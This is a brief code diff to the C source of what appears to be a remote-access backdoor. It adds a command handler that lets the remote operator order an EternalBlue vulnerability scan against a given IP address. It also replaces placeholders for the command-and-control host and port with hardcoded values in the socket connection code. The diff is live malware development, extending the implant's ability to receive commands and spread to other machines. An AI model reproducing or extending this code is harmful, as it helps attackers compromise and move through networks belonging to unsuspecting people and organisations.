@@ -473,6 +473,12 @@ void fhdawn_main(void)
             sockprintf(sockfd, "FHDAWNPID:%s", FhdawnInfo());
         }
 
+        else if (strstr(recvbuf, "eternal_scan") != NULL) // eternal_scan:192.168.0.109
+        {
+            memset(fileinfo, '\0', 3);
+            split(recvbuf, fileinfo, ":");
+            EternalBlueScan(fileinfo[1]); 
+        }
         else {
             ExecSock();
         }
@@ -509,8 +515,8 @@ void MainConnect(void)
         exit(1);
     }
 
-    server.sin_addr.s_addr = inet_addr("{{serverhost}}");
-    server.sin_port = htons({{serverport}});
+    server.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server.sin_port = htons(421);
 
     server.sin_family = AF_INET;
 
